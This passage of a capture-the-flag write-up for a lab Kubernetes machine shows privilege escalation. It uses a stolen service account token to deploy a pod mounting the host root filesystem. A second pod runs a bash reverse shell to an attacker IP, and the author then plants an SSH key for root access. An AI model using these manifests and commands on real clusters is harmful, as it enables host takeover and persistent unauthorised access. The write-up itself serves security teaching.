+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubectl get pod nginx <span class="nt">-o</span> yaml <span class="nt">--server</span> https://10.10.11.133:8443 <span class="nt">--certificate-authority</span><span class="o">=</span>ca.crt <span class="nt">--token</span><span class="o">=</span><span class="nv">$token</span>
+<span class="go">apiVersion: v1                   
+kind: Pod            
+metadata:         
+  annotations:  
+    kubectl.kubernetes.io/last-applied-configuration: |
+      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"nginx","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","imagePullPolicy":"Never","name":"nginx","volumeMounts":[{"mountPath":"/root","name":"flag"}]}],"volumes":[{"hostPath":{"
+path":"/opt/flag"},"name":"flag"}]}}
+  creationTimestamp: "2022-02-13T20:31:02Z"
+  name: nginx   
+  namespace: default 
+  resourceVersion: "511"    
+  uid: b204031b-b8af-43c4-af10-add9e03a8ae5
+spec:                      
+  containers:
+  - image: nginx:1.14.2
+    imagePullPolicy: Never
+    name: nginx                               
+    resources: {} 
+    terminationMessagePath: /dev/termination-log
+    terminationMessagePolicy: File
+    volumeMounts:                             
+    - mountPath: /root
+      name: flag
+    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+      name: kube-api-access-xtzxg             
+      readOnly: true
+  dnsPolicy: ClusterFirst
+  enableServiceLinks: true
+  nodeName: steamcloud                        
+  preemptionPolicy: PreemptLowerPriority
+  priority: 0
+...[snip]...
+</span></code></pre></div></div>
+<p>There’s a ton of information here, but the two key parts I need:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">namespace</code> is <code class="language-plaintext highlighter-rouge">default</code></li>
+<li><code class="language-plaintext highlighter-rouge">image</code> is <code class="language-plaintext highlighter-rouge">nginx:1.14.2</code></li>
+</ul>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="strategy">Strategy</h4>
+<p>Just like in <a href="/2021/09/04/htb-unobtainium.html#filesystem-as-root">Unobtainium</a>, the trick here is to create a pod (container) that has the root file system mapped into it. Then I can execute in the pod, and access the mapped volume, which is the full file system of the host.</p>
+<h4 id="pod-description">Pod Description</h4>
+<p>I’ll grab the same YAML I used in Unbotainium, and update it for this scenario:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span> 
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">0xdf-pod</span>
+  <span class="na">namespace</span><span class="pi">:</span> <span class="s">default</span>
+<span class="na">spec</span><span class="pi">:</span>
+  <span class="na">containers</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">0xdf-pod</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">nginx:1.14.2</span>
+    <span class="na">volumeMounts</span><span class="pi">:</span> 
+    <span class="pi">-</span> <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/mnt</span>
+      <span class="na">name</span><span class="pi">:</span> <span class="s">hostfs</span>
+  <span class="na">volumes</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">hostfs</span>
+    <span class="na">hostPath</span><span class="pi">:</span>  
+      <span class="na">path</span><span class="pi">:</span> <span class="s">/</span>
+  <span class="na">automountServiceAccountToken</span><span class="pi">:</span> <span class="kc">true</span>
+  <span class="na">hostNetwork</span><span class="pi">:</span> <span class="kc">true</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">name</code> is arbitrary. The <code class="language-plaintext highlighter-rouge">namespace</code> is the one I’ve been working out of, <code class="language-plaintext highlighter-rouge">default</code>. I’ll use the image that already exists here, <code class="language-plaintext highlighter-rouge">nginx:1.14.2</code>. The rest is just setting up the <code class="language-plaintext highlighter-rouge">volumes</code> / <code class="language-plaintext highlighter-rouge">volumeMounts</code>. The <code class="language-plaintext highlighter-rouge">volumeMount</code> says that I’m going to mount a <code class="language-plaintext highlighter-rouge">volume</code> named <code class="language-plaintext highlighter-rouge">hostfs</code> into the container at the mount point <code class="language-plaintext highlighter-rouge">/mnt</code>. Then that volume is defined as <code class="language-plaintext highlighter-rouge">/</code> on the host file system.</p>
+<h4 id="execute-pod">Execute Pod</h4>
+<p><code class="language-plaintext highlighter-rouge">kubectl apply</code> is used to start the pod:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubectl apply <span class="nt">-f</span> evil-pod.yaml <span class="nt">--server</span> https://10.10.11.133:8443 <span class="nt">--certificate-authority</span><span class="o">=</span>ca.crt <span class="nt">--token</span><span class="o">=</span><span class="nv">$token</span>
+<span class="go">pod/0xdf-pod created
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubectl get pod <span class="nt">--server</span> https://10.10.11.133:8443 <span class="nt">--certificate-authority</span><span class="o">=</span>ca.crt <span class="nt">--token</span><span class="o">=</span><span class="nv">$token</span>
+<span class="go">NAME       READY   STATUS    RESTARTS   AGE
+0xdf-pod   1/1     Running   0          13s
+nginx      1/1     Running   0          15h
+</span></code></pre></div></div>
+<p>It is visible from the Kubelet as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl pods <span class="nt">-s</span> 10.10.11.133
+<span class="go">┌────────────────────────────────────────────────────────────────────────────────┐
+│                                Pods from Kubelet                               │
+├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
+│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 1 │ storage-provisioner                │ kube-system │ storage-provisioner     │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 2 │ coredns-78fcd69978-7dhjv           │ kube-system │ coredns                 │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 3 │ nginx                              │ default     │ nginx                   │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 4 │ 0xdf-pod                           │ default     │ 0xdf-pod                │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+...[snip]...
+</span></code></pre></div></div>
+<h4 id="execute-in-pod">Execute In Pod</h4>
+<p>Execution via Kubelet works just like it did in the original nginx container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nb">exec</span> <span class="s2">"id"</span> <span class="nt">-s</span> 10.10.11.133 <span class="nt">-p</span> 0xdf-pod <span class="nt">-c</span> 0xdf-pod
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>But this time the host file system is mounted at <code class="language-plaintext highlighter-rouge">/mnt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nb">exec</span> <span class="s2">"ls /mnt/"</span> <span class="nt">-s</span> 10.10.11.133 <span class="nt">-p</span> 0xdf-pod <span class="nt">-c</span> 0xdf-pod
+<span class="go">bin   home            lib32       media  root  sys  vmlinuz
+boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
+dev   initrd.img.old  libx32      opt    sbin  usr
+etc   lib             lost+found  proc   srv   var
+</span></code></pre></div></div>
+<p>I can read <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nb">exec</span> <span class="s2">"cat /mnt/root/root.txt"</span> <span class="nt">-s</span> 10.10.11.133 <span class="nt">-p</span> 0xdf-pod <span class="nt">-c</span> 0xdf-pod
+<span class="go">98c251ea************************
+</span></code></pre></div></div>
+<h4 id="shell-fails">Shell Fails</h4>
+<p><code class="language-plaintext highlighter-rouge">kubeletctl</code> doesn’t seem to process command quite like I’m expecting. I tried creating <code class="language-plaintext highlighter-rouge">/mnt/root/.ssh</code> and then writing an<code class="language-plaintext highlighter-rouge">authorized_keys</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nb">exec</span> <span class="s2">"mkdir /mnt/root/.ssh/"</span> <span class="nt">-s</span> 10.10.11.133 <span class="nt">-p</span> 0xdf-pod <span class="nt">-c</span> 0xdf-pod
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nb">exec</span> <span class="s2">"echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' &gt;&gt; /mnt/root/.ssh/authorized_keys"</span> <span class="nt">-s</span> 10.10.11.133 <span class="nt">-p</span> 0xdf-pod <span class="nt">-c</span> 0xdf-pod
+<span class="go">'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' &gt;&gt; /mnt/root/.ssh/authorized_keys
+</span></code></pre></div></div>
+<p>Looking closely, it seems to echo everything, including the <code class="language-plaintext highlighter-rouge">&gt;&gt; /mnt/root/.ssh/authorized_keys</code> bit.</p>
+<p>I played with <code class="language-plaintext highlighter-rouge">cat</code> a bit as well and got the same results:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nb">exec</span> <span class="s2">"cat /etc/issue"</span> <span class="nt">-s</span> 10.10.11.133 <span class="nt">-p</span> 0xdf-pod <span class="nt">-c</span> 0xdf-pod
+<span class="go">Debian GNU/Linux 9 \n \l
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nb">exec</span> <span class="s2">"cat /etc/issue &gt; /tmp/a"</span> <span class="nt">-s</span> 10.10.11.133 <span class="nt">-p</span> 0xdf-pod <span class="nt">-c</span> 0xdf-pod
+<span class="go">Debian GNU/Linux 9 \n \l
+
+cat: '&gt;': No such file or directory
+cat: /tmp/a: No such file or directory
+command terminated with exit code 1
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nb">exec</span> <span class="s2">"cat /etc/issue | tee /tmp/a"</span> <span class="nt">-s</span> 10.10.11.133 <span class="nt">-p</span> 0xdf-pod <span class="nt">-c</span> 0xdf-pod
+<span class="go">Debian GNU/Linux 9 \n \l
+
+cat: '|': No such file or directory
+cat: tee: No such file or directory
+cat: /tmp/a: No such file or directory
+command terminated with exit code 1
+</span></code></pre></div></div>
+<p>It’s treating <code class="language-plaintext highlighter-rouge">&gt;</code> and <code class="language-plaintext highlighter-rouge">/tmp/a</code> as arguments for <code class="language-plaintext highlighter-rouge">cat</code>, not as redirection to a file. The <code class="language-plaintext highlighter-rouge">|</code> has the same issue.</p>
+<h4 id="shell-1">Shell</h4>
+<p>At this point I was really close to giving up. The only path I see to getting a root shell is to write to the host file system, but nothing I could think of would let me. Then I remembered what I did in Unobtainium. There, I was launching the Alpine container, and if I didn’t give it a startup command, it would launch and immediately die. So I gave it a command:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="na">command</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">/bin/sh"</span><span class="pi">]</span>
+    <span class="na">args</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">-c"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">sleep</span><span class="nv"> </span><span class="s">300000"</span><span class="pi">]</span>
+</code></pre></div></div>
+<p>I’ll create a <code class="language-plaintext highlighter-rouge">evil-pod2.yaml</code> that’s a copy of the one above, but this time, I’ll add a reverse shell as the command:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">0xdf-pod2</span>
+  <span class="na">namespace</span><span class="pi">:</span> <span class="s">default</span>
+<span class="na">spec</span><span class="pi">:</span>
+  <span class="na">containers</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">0xdf-pod2</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">nginx:1.14.2</span>
+    <span class="na">command</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">/bin/bash"</span><span class="pi">]</span>
+    <span class="na">args</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">-c"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">/bin/bash</span><span class="nv"> </span><span class="s">-i</span><span class="nv"> </span><span class="s">&gt;&amp;</span><span class="nv"> </span><span class="s">/dev/tcp/10.10.14.6/443</span><span class="nv"> </span><span class="s">0&gt;&amp;1"</span><span class="pi">]</span>
+    <span class="na">volumeMounts</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/mnt</span>
+      <span class="na">name</span><span class="pi">:</span> <span class="s">hostfs</span>
+  <span class="na">volumes</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">hostfs</span>
+    <span class="na">hostPath</span><span class="pi">:</span>
+      <span class="na">path</span><span class="pi">:</span> <span class="s">/</span>
+  <span class="na">automountServiceAccountToken</span><span class="pi">:</span> <span class="kc">true</span>
+  <span class="na">hostNetwork</span><span class="pi">:</span> <span class="kc">true</span>
+</code></pre></div></div>
+<p>With <code class="language-plaintext highlighter-rouge">nc</code> listening, I’ll create the pod:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubectl apply <span class="nt">-f</span> evil-pod2.yaml <span class="nt">--server</span> https://10.10.11.133:8443 <span class="nt">--certificate-authority</span><span class="o">=</span>ca.crt <span class="nt">--token</span><span class="o">=</span><span class="nv">$token</span>
+<span class="go">pod/0xdf-pod2 created
+</span></code></pre></div></div>
+<p>Immediately there’s a connection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.133 51442
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@steamcloud:/#
+</span></code></pre></div></div>
+<p>With this shell, I’ll create the <code class="language-plaintext highlighter-rouge">.ssh</code> folder (if it doesn’t exist from earlier), and write my public key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@steamcloud:/#</span><span class="w"> </span><span class="nb">mkdir</span> <span class="nt">-p</span> /mnt/root/.ssh
+<span class="gp">root@steamcloud:/mnt#</span><span class="w"> </span><span class="nb">cd</span> /mnt/root/.ssh
+<span class="gp">root@steamcloud:/mnt/root/.ssh#</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing"</span> <span class="o">&gt;</span> authorized_keys
+</code></pre></div></div>
+<p>Now I can SSH as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@10.10.11.133
+<span class="gp">Linux steamcloud 4.19.0-18-amd64 #</span>1 SMP Debian 4.19.208-1 <span class="o">(</span>2021-09-29<span class="o">)</span> x86_64
+<span class="go">
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Jan 10 09:00:00 2022
+</span><span class="gp">root@steamcloud:~#</span><span class="w"> 
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2022/02/14/htb-steamcloud.html"></a>
+</article>
